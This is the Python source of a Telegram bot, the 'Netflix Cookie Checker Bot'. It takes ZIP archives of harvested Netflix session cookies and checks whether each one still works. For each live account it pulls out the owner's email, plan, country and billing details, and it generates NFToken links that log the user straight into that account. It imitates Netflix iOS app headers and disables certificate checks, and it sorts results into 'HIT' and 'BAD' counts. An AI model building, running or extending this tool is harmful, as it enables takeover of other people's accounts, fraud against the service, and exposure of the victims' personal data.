import os
import sys
import re
import json
import zipfile
import tempfile
import shutil
import asyncio
import requests
import urllib.parse
from datetime import datetime
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ KEEP ALIVE SERVER FOR RENDER ============
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import threading
    
    class KeepAliveHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
        
        def log_message(self, format, *args):
            pass
    
    def run_keep_alive():
        try:
            port = int(os.environ.get("PORT", 10000))
            server = HTTPServer(("0.0.0.0", port), KeepAliveHandler)
            server.serve_forever()
        except:
            pass
    
    keep_alive_thread = threading.Thread(target=run_keep_alive, daemon=True)
    keep_alive_thread.start()
    print("✅ Keep-alive server started")
except Exception as e:
    print(f"⚠️ Keep-alive server not started: {e}")

# ============ TELEGRAM IMPORTS ============
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
except Exception as e:
    print(f"❌ Telegram import error: {e}")
    sys.exit(1)

# ============ NETFLIX CONFIGURATION ============
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ============ BOT CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN environment variable not set!")
    sys.exit(1)

MAX_FILE_SIZE = 5 * 1024 * 1024
MAX_THREADS = 3  # Changed to 3 for stability

# ============ COUNTERS ============
class Counters:
    def __init__(self):
        self.hit = 0
        self.custom = 0
        self.free = 0
        self.bad = 0
        self.lock = Lock()
    
    def get_stats(self):
        with self.lock:
            return f"HIT: {self.hit} | CUSTOM: {self.custom} | FREE: {self.free} | BAD: {self.bad}"
    
    def add_hit(self):
        with self.lock:
            self.hit += 1
    
    def add_custom(self):
        with self.lock:
            self.custom += 1
    
    def add_free(self):
        with self.lock:
            self.free += 1
    
    def add_bad(self):
        with self.lock:
            self.bad += 1
    
    def reset(self):
        with self.lock:
            self.hit = 0
            self.custom = 0
            self.free = 0
            self.bad = 0

counters = Counters()

# ============ COOKIE EXTRACTION FUNCTIONS ============
def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def fix_email_display(email):
    if not email or email == "Unknown":
        return email
    return email.replace('\\x40', '@').replace('%40', '@')

def extract_cookie_dict(text):
    cookie_dict = {}
    
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))
    
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None
    
    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = decode_cookie_value(value)
    
    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = decode_cookie_value(match.group(1))
    
    return cookie_dict

def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return extract_cookie_dict(content)
    except Exception:
        return {}

def get_nftoken_from_cookies(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None, None
    
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    
    try:
        response = requests.get(
            API_URL,
            params=QUERY_PARAMS,
            headers=headers,
            timeout=30,
            verify=False,
        )
        response.raise_for_status()
        data = response.json()
        
        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
        token = token_data.get("token")
        expires = token_data.get("expires")
        
        if not token:
            return None, None
        
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        
        return token, expires
    except Exception:
        return None, None

def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)

def get_account_info(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None
    
    url = "https://www.netflix.com/account"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }
    cookies = {"NetflixId": netflix_id}
    
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=15, verify=False)
        text = response.text
        
        info = {
            "status": "Unknown",
            "email": "Unknown",
            "country": "Unknown",
            "plan": "Unknown",
            "maxStreams": "Unknown",
            "memberSince": "Unknown",
            "nextBilling": "Unknown",
        }
        
        status_match = re.search(r'"membershipStatus":"(\w+)"', text)
        if status_match:
            status = status_match.group(1)
            if status == "CURRENT_MEMBER":
                info["status"] = "Active"
            elif status == "FORMER_MEMBER":
                info["status"] = "Canceled"
            elif status == "NEVER_MEMBER":
                info["status"] = "Free"
            else:
                info["status"] = status
        
        email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
        if not email_match:
            email_match = re.search(r'"emailAddress":"([^"]+)"', text)
        if email_match:
            info["email"] = fix_email_display(email_match.group(1))
        
        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
        if country_match:
            info["country"] = country_match.group(1)
        
        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
        if not plan_match:
            plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
        if plan_match:
            info["plan"] = plan_match.group(1)
        
        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
        if streams_match:
            info["maxStreams"] = streams_match.group(1)
        
        since_match = re.search(r'"memberSince":"([^"]+)"', text)
        if since_match:
            info["memberSince"] = since_match.group(1)
        
        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
        if billing_match:
            info["nextBilling"] = billing_match.group(1)
        
        return info
    except Exception:
        return None

def classify_plan(plan_name):
    if not plan_name:
        return "Unknown"
    
    plan_lower = plan_name.lower()
    basic_keywords = ["basic", "dasar", "asas", "basis", "básico", "essentiel", "base"]
    standard_keywords = ["standard", "standar", "standart", "estándar", "padrão"]
    premium_keywords = ["premium", "prémium", "perhe"]
    
    for kw in basic_keywords:
        if kw in plan_lower:
            return "Basic"
    for kw in standard_keywords:
        if kw in plan_lower:
            return "Standard"
    for kw in premium_keywords:
        if kw in plan_lower:
            return "Premium"
    
    return plan_name

def is_valid_cookie(cookie_dict):
    return REQUIRED_COOKIE in cookie_dict

# ============ FILE PROCESSING FUNCTIONS ============
def extract_zip(file_path, extract_path):
    try:
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        return True, None
    except zipfile.BadZipFile:
        return False, "Corrupted ZIP file"
    except Exception as e:
        return False, f"Extraction error: {str(e)}"

def find_txt_files(folder_path):
    txt_files = []
    try:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
    except Exception:
        pass
    return txt_files

# ============ PROCESS COOKIE (SINGLE FILE) ============
def process_cookie_file(file_path):
    try:
        cookie_dict = extract_cookies_from_file(file_path)
        
        if not is_valid_cookie(cookie_dict):
            return None
        
        account_info = get_account_info(cookie_dict)
        if not account_info or account_info["status"] == "Unknown":
            return None
        
        account_info["email"] = fix_email_display(account_info["email"])
        
        token, expires = get_nftoken_from_cookies(cookie_dict)
        
        if not token:
            return None
        
        result = {
            "email": account_info["email"],
            "status": account_info["status"],
            "country": account_info["country"],
            "plan": account_info["plan"],
            "plan_type": classify_plan(account_info["plan"]),
            "maxStreams": account_info["maxStreams"],
            "memberSince": account_info["memberSince"],
            "nextBilling": account_info["nextBilling"],
            "nftoken": token,
            "expires": expires,
            "expiry_formatted": format_expiry(expires),
            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
        }
        
        return result
    except Exception as e:
        return None

# ============ MAIN BOT FUNCTIONS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
        [InlineKeyboardButton("📖 How to Use", callback_data="help")],
        [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎬 **Netflix Cookie Checker Bot**\n\n"
        "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
        f"⚡ **Using {MAX_THREADS} threads for fast processing**\n"
        "⚠️ **Maximum file size: 5 MB**\n\n"
        "I will check all cookies, extract account info, and generate NFToken links.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 **How to Use**\n\n"
        "1️⃣ Collect Netflix cookies in TXT files\n"
        "2️⃣ Put all files in one folder\n"
        "3️⃣ Compress folder as ZIP\n"
        "4️⃣ Send the ZIP file to the bot\n\n"
        "📂 **Required Cookie Format:**\n"
        "• Netscape format or JSON\n"
        "• Must contain: NetflixId\n"
        "• Optional: SecureNetflixId\n\n"
        "⚙️ **What the bot does:**\n"
        "• Validates cookies\n"
        "• Extracts account information\n"
        "• Generates PC and Phone NFToken links\n"
        "• Shows each account in a separate message\n"
        f"• Uses {MAX_THREADS} threads for speed"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        if update.callback_query:
            await update.callback_query.edit_message_text(
                help_text,
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
    except Exception as e:
        pass

async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    about_text = (
        "ℹ️ **About Bot**\n\n"
        "Netflix Cookie Checker Bot\n"
        "Checks Netflix cookies and generates NFToken links.\n\n"
        "🔹 Version: 4.0\n"
        "🔹 Supports: ZIP only\n"
        "🔹 Max file size: 5 MB\n"
        f"🔹 Threads: {MAX_THREADS}\n"
        "🔹 Each account shown separately\n"
        "🔹 Live statistics during scanning"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        if update.callback_query:
            await update.callback_query.edit_message_text(
                about_text,
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
    except Exception as e:
        pass

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = (
        "📊 **Current Statistics**\n\n"
        f"{counters.get_stats()}\n\n"
        "🔄 Use /resetstats to reset counters"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="back")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        if update.callback_query:
            await update.callback_query.edit_message_text(
                stats_text,
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    except Exception as e:
        pass

async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    counters.reset()
    if update.callback_query:
        await update.callback_query.answer("📊 Statistics reset successfully!", show_alert=True)
        await stats_command(update, context)
    else:
        await update.message.reply_text("📊 Statistics have been reset!")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    try:
        if query.data == "send_file":
            await query.edit_message_text(
                "📤 **Send the ZIP file now**\n\n"
                "Supported format: ZIP only\n"
                "Maximum size: 5 MB",
                parse_mode="Markdown"
            )
        
        elif query.data == "help":
            await help_command(update, context)
        
        elif query.data == "about":
            await about_command(update, context)
        
        elif query.data == "stats":
            await stats_command(update, context)
        
        elif query.data == "reset_stats":
            await reset_stats_command(update, context)
        
        elif query.data == "back":
            keyboard = [
                [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
                [InlineKeyboardButton("📖 How to Use", callback_data="help")],
                [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
                [InlineKeyboardButton("📊 Stats", callback_data="stats")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "🎬 **Netflix Cookie Checker Bot**\n\n"
                "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
                f"⚡ **Using {MAX_THREADS} threads for fast processing**\n"
                "⚠️ **Maximum file size: 5 MB**",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
    except Exception as e:
        pass

async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, extract_dir, status_msg):
    try:
        # Extract ZIP
        success, error_msg = extract_zip(file_path, extract_dir)
        
        if not success:
            await status_msg.edit_text(
                f"❌ **Failed to extract archive!**\n\n{error_msg}",
                parse_mode="Markdown"
            )
            return
        
        # Find TXT files
        txt_files = find_txt_files(extract_dir)
        
        if not txt_files:
            await status_msg.edit_text(
                "❌ **No TXT files found!**\n\nThe archive doesn't contain any TXT files.",
                parse_mode="Markdown"
            )
            return
        
        total_files = len(txt_files)
        results = []
        completed = 0
        
        # Process files one by one (no threads to avoid issues)
        for txt_file in txt_files:
            try:
                result = process_cookie_file(txt_file)
                completed += 1
                
                if result:
                    results.append(result)
                    if result["status"] == "Active":
                        counters.add_hit()
                    elif result["status"] == "Canceled":
                        counters.add_custom()
                    elif result["status"] == "Free":
                        counters.add_free()
                else:
                    counters.add_bad()
                
                # Update status every file
                await status_msg.edit_text(
                    f"⏳ **Processing your file...**\n\n"
                    f"📁 {completed}/{total_files} files checked\n"
                    f"📊 {counters.get_stats()}",
                    parse_mode="Markdown"
                )
                
            except Exception as e:
                counters.add_bad()
                print(f"Error processing file: {e}")
                continue
        
        # Delete status message
        await status_msg.delete()
        
        if not results:
            await update.message.reply_text(
                "❌ **No valid accounts found!**\n\n"
                f"Total files checked: {total_files}\n\n"
                f"📊 {counters.get_stats()}",
                parse_mode="Markdown"
            )
        else:
            # Send each account as a separate message
            for i, result in enumerate(results, 1):
                await send_account_message(update, context, result, i, len(results))
            
            # Send summary with stats
            await update.message.reply_text(
                f"✅ **Scan Complete!**\n\n"
                f"📊 Total accounts found: {len(results)}\n"
                f"📁 Files checked: {total_files}\n\n"
                f"📊 {counters.get_stats()}",
                parse_mode="Markdown"
            )
            
    except Exception as e:
        await status_msg.edit_text(
            f"❌ **Error processing file!**\n\n{str(e)}",
            parse_mode="Markdown"
        )
    finally:
        try:
            shutil.rmtree(os.path.dirname(extract_dir))
        except:
            pass

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        document = update.message.document
        
        if document.file_size > MAX_FILE_SIZE:
            await update.message.reply_text(
                "❌ **File too large!**\n\n"
                f"Maximum size: 5 MB\n"
                f"Your file size: {document.file_size / (1024*1024):.2f} MB",
                parse_mode="Markdown"
            )
            return
        
        file_name = document.file_name or ""
        if not file_name.lower().endswith('.zip'):
            await update.message.reply_text(
                "❌ **Unsupported file format!**\n\nPlease send ZIP files only.",
                parse_mode="Markdown"
            )
            return
        
        # Create status message
        status_msg = await update.message.reply_text(
            f"⏳ **Processing your file...**\n\n"
            f"📊 {counters.get_stats()}",
            parse_mode="Markdown"
        )
        
        # Create temp directories
        temp_dir = tempfile.mkdtemp()
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        # Download file
        file_path = os.path.join(temp_dir, file_name)
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        # Process file
        await process_zip_file(update, context, file_path, extract_dir, status_msg)
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ **Error: {str(e)}**",
            parse_mode="Markdown"
        )

async def send_account_message(update, context, result, index, total):
    status_emoji = "✅" if "Active" in result["status"] else "❌" if "Canceled" in result["status"] else "🆓"
    
    if result["plan_type"] == "Premium":
        plan_emoji = "🟣"
    elif result["plan_type"] == "Standard":
        plan_emoji = "🔵"
    elif result["plan_type"] == "Basic":
        plan_emoji = "🟢"
    else:
        plan_emoji = "⚪"
    
    time_left_str = "Unknown"
    if result.get("expires"):
        try:
            expiry_dt = datetime.fromtimestamp(result["expires"])
            time_now = datetime.now()
            time_left = expiry_dt - time_now
            if time_left.total_seconds() > 0:
                days = time_left.days
                hours = time_left.seconds // 3600
                minutes = (time_left.seconds % 3600) // 60
                time_left_str = f"{days}d {hours}h {minutes}m"
            else:
                time_left_str = "⏰ EXPIRED"
        except:
            pass
    
    message = f"🎬 **Account #{index}/{total}**\n\n"
    message += f"📧 **Email:** `{result['email']}`\n"
    message += f"📊 **Status:** {status_emoji} {result['status']}\n"
    message += f"🌍 **Country:** {result['country']}\n"
    message += f"📦 **Plan:** {result['plan']} {plan_emoji} {result['plan_type']}\n"
    message += f"📺 **Max Streams:** {result['maxStreams']}\n"
    message += f"📅 **Member Since:** {result['memberSince']}\n"
    message += f"💳 **Next Billing:** {result['nextBilling']}\n"
    message += f"⏱️ **Expires:** {result['expiry_formatted']}\n"
    message += f"⏳ **Time Left:** {time_left_str}\n\n"
    message += "🔑 **NFToken Links:**"
    
    keyboard = [
        [InlineKeyboardButton("💻 PC Link", url=result['pc_link'])],
        [InlineKeyboardButton("📱 Phone Link", url=result['phone_link'])],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        print(f"Error: {context.error}")
        if update and update.message:
            await update.message.reply_text(
                "❌ **An error occurred!**\n\nPlease try again later.",
                parse_mode="Markdown"
            )
    except:
        pass

# ============ MAIN ============
def main():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("about", about_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("resetstats", reset_stats_command))
        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(send_file|help|about|back|stats|reset_stats)$"))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_error_handler(error_handler)
        
        print("🤖 Netflix Cookie Checker Bot is running...")
        print(f"✅ Using {MAX_THREADS} threads for processing")
        print("📁 Supported format: ZIP only")
        print("📦 Max file size: 5 MB")
        print("📊 Live statistics enabled!")
        print("🌐 Keep-alive server running for Render")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
